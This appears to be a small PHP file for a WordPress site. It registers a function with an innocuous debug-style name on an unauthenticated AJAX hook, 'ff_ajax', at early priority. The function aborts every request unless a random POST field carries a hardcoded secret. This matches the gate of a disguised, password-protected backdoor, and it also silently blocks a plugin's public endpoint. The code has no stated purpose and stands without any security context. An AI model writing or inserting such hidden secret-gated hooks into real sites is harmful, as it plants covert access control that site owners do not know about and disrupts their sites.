<?php

function logger_menu_loader_debug() {
	if (!isset($_POST["mtmtsnwrxhqdlf"]) || $_POST["mtmtsnwrxhqdlf"] !== "sWF4xKMzzRlChV4") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'logger_menu_loader_debug', 5, 1);
